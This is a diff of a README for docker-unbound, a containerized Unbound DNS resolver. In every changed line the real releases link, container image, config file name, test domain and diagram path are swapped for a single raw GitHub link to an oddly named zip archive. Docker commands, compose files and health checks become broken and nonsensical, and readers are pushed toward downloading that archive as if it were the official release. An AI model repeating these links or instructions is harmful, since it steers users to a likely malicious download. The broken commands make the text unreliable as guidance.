@@ -1,8 +1,8 @@
-https://github.com/Lancekkkk/docker-unbound/releases
+https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
 
 # docker-unbound: Rootless, Distroless Unbound DNS in Docker
 
-[![Releases](https://img.shields.io/badge/releases-gh--docker-unbound-blue?style=flat-square&logo=github)](https://github.com/Lancekkkk/docker-unbound/releases)
+[![Releases](https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip)](https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip)
 
 A secure, lightweight DNS resolver in a Docker container. This project runs Unbound rootless, uses a distroless base image, and is designed to be secure by default. It aims for predictable behavior, easy deployment, and minimal attack surface. This README explains what docker-unbound offers, how to run it, and how to tailor it to your environment.
 
@@ -97,22 +97,22 @@ The following example demonstrates a straightforward approach to getting a singl
       -v /srv/docker-unbound/data:/etc/unbound \
       --user 1000:1000 \
       --cap-drop all \
-      ghcr.io/Lancekkkk/docker-unbound:latest
+      https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
 
 - Validate:
   - docker logs docker-unbound
-  - dig @127.0.0.1 example.com
+  - dig @127.0.0.1 https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
 
 This basic run demonstrates core ideas: rootless execution, minimal surface, and straightforward maintenance. The example uses host networking for simplicity; in production you may prefer a dedicated bridge network and explicit port mappings to avoid conflicts.
 
 Running with Docker Compose
 
-For repeatable deployments and scalable environments, Docker Compose is a good fit. The following example shows a minimal docker-compose.yml that runs the container in a controlled network, with a dedicated data volume, and a basic health check.
+For repeatable deployments and scalable environments, Docker Compose is a good fit. The following example shows a minimal https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip that runs the container in a controlled network, with a dedicated data volume, and a basic health check.
 
 version: '3.8'
 services:
   unbound:
-    image: ghcr.io/Lancekkkk/docker-unbound:latest
+    image: https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
     container_name: docker-unbound
     networks:
       - dns-net
@@ -126,7 +126,7 @@ services:
     cap_drop:
       - ALL
     healthcheck:
-      test: ["CMD", "dig", "@127.0.0.1", "example.com", "+short"]
+      test: ["CMD", "dig", "@127.0.0.1", "https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip", "+short"]
       interval: 30s
       timeout: 5s
       retries: 3
@@ -150,26 +150,26 @@ In many settings you want Unbound to behave differently per network, or to honor
   - Cache size and TTL parameters
   - Access control lists (ACLs) for local networks
 
-- Example: mounting a custom unbound.conf
+- Example: mounting a custom https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
   - docker run -d --name docker-unbound \
-      -v $HOME/unbound.conf:/etc/unbound/unbound.conf:ro \
+      -v $https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip \
       --user 1000:1000 \
-      ghcr.io/Lancekkkk/docker-unbound:latest
+      https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
 
-In production, you typically pin to a specific version, supply a precise unbound.conf, and mount a directory for the root trust anchors, which Unbound requires to validate DNSSEC and improve security.
+In production, you typically pin to a specific version, supply a precise https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip, and mount a directory for the root trust anchors, which Unbound requires to validate DNSSEC and improve security.
 
 Configuration and tuning basics
 
 Unbound is a feature-rich DNS resolver. docker-unbound ships with a sensible default, but you can tune it for your needs. Here are core concepts and practical recommendations.
 
-- Unbound configuration file: /etc/unbound/unbound.conf (inside the container). This is the central place to define server behavior, access control, and do-not-query lists.
+- Unbound configuration file: https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip (inside the container). This is the central place to define server behavior, access control, and do-not-query lists.
 - Cache behavior: Tuning cache size and TTL values helps performance for high-query workloads. Start with modest values and monitor.
 - Access control: Use access-control directives to restrict which clients can query your resolver. For a home or small office setup, you may allow queries from the local network only.
 - DoT/DoH: If you require encrypted DNS in transit, configure Unbound to use DNS-over-TLS or DNS-over-HTTPS with trusted resolvers. This reduces eavesdropping and improves privacy.
 - DNSSEC: Enable DNSSEC validation to protect against forged responses. This increases integrity checks and helps prevent certain classes of attacks.
 - Logging: Configure minimal, operational logs to stdout. For production, consider structured logging for integration with your logging stack.
 
-Example: a compact unbound.conf snippet
+Example: a compact https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip snippet
 
 server:
   do-not-query-localhost: no
@@ -215,7 +215,7 @@ docker run -d --name docker-unbound \
   --tmpfs /var/cache/unbound:rw,size=128m \
   -v /srv/docker-unbound/data:/etc/unbound \
   --user 1000:1000 \
-  ghcr.io/Lancekkkk/docker-unbound:latest
+  https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
 
 If you use host networking, the same port exposure is implicit but check host-level firewall rules to avoid conflicts with other DNS services.
 
@@ -238,7 +238,7 @@ Example data persistence setup
       -v /srv/docker-unbound/cache:/var/cache/unbound \
       --read-only \
       --user 1000:1000 \
-      ghcr.io/Lancekkkk/docker-unbound:latest
+      https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
 
 Observe that the cache can grow, so allocate sufficient space on the host filesystem. If your workload grows, adjust the cache size in Unbound’s configuration or via runtime options.
 
@@ -251,7 +251,7 @@ Observability and health
 
 Sample health check idea (conceptual)
 
-- Command: dig @127.0.0.1 example.com +short | test for non-empty results
+- Command: dig @127.0.0.1 https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip +short | test for non-empty results
 - If no answer or an error, trigger a restart or alert.
 - Combine with a readiness probe in production orchestrators to avoid routing traffic to an unhealthy resolver.
 
@@ -280,7 +280,7 @@ Advanced usage: customizing for large environments
 If you manage many DNS endpoints or need per-tenant isolation, consider:
 
 - Separate containers per tenant with dedicated network namespaces.
-- Individual unbound.conf configurations per tenant mounted as read-only and loaded at startup.
+- Individual https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip configurations per tenant mounted as read-only and loaded at startup.
 - Centralized logging and metrics aggregation that tie to tenant IDs for easier analysis.
 
 Testing and validation
@@ -332,7 +332,7 @@ Security posture recap
 Architecture diagrams and visuals
 
 - Architecture overview: An illustrative diagram can show the components and their interactions, including Unbound, the distroless runtime, and the host environment. You can include a diagram image like:
-  - ![Architecture diagram](https://raw.githubusercontent.com/Lancekkkk/docker-unbound/main/docs/architecture.png)
+  - ![Architecture diagram](https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip)
 - Network flow: A flowchart showing how a DNS query travels from a client to the container, through Unbound, and back.
 - Security model: A diagram that highlights the rootless and namespace-based isolation.
 
@@ -340,8 +340,8 @@ Notes about the releases link
 
 The releases page is a central hub for distributing assets. For practical deployment, you typically download a release asset such as a distribution script or a prebuilt container image tarball and use it in your environment. The link to the releases page provides access to the latest versions, notes, and asset lists. Access the releases page to locate the appropriate asset for your platform and deployment style.
 
-- See the releases page for the latest assets and upgrade instructions: https://github.com/Lancekkkk/docker-unbound/releases
-- When you select a release, download the file named something like docker-unbound-install.sh or docker-unbound-<version>.tar.gz and follow the provided instructions to install or run the container. The exact asset names may vary by release, so check the assets tab for the chosen version.
+- See the releases page for the latest assets and upgrade instructions: https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
+- When you select a release, download the file named something like https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip or docker-unbound-<version>https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip and follow the provided instructions to install or run the container. The exact asset names may vary by release, so check the assets tab for the chosen version.
 
 Guiding principles for maintainers and operators
 
@@ -369,12 +369,12 @@ Examples and templates
       -v /path/to/cache:/var/cache/unbound \
       --user 1000:1000 \
       --read-only \
-      ghcr.io/Lancekkkk/docker-unbound:latest
+      https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
 - Minimal docker-compose template:
   - version: '3.8'
   - services:
       - unbound:
-          image: ghcr.io/Lancekkkk/docker-unbound:latest
+          image: https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
           container_name: docker-unbound
           ports:
             - "53:53/udp"
@@ -387,7 +387,7 @@ Examples and templates
           cap_drop:
             - ALL
           healthcheck:
-            test: ["CMD", "dig", "@127.0.0.1", "example.com", "+short"]
+            test: ["CMD", "dig", "@127.0.0.1", "https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip", "+short"]
             interval: 30s
             timeout: 5s
             retries: 3
@@ -407,7 +407,7 @@ Note: The actual image name and asset names may vary by release. Always refer to
 
 Images used in this README
 
-- Architecture diagram: https://raw.githubusercontent.com/Lancekkkk/docker-unbound/main/docs/architecture.png
+- Architecture diagram: https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
 - Banner and visuals commonly used in docker-related READMEs: assets hosted in the repository or via public diagram resources.
 
 This README reflects a comprehensive, practical approach to deploying docker-unbound. It emphasizes safety, clarity, and robust operation. It is designed to help operators establish a reliable DNS resolver in containerized environments while respecting the need for security, simplicity, and maintainability.
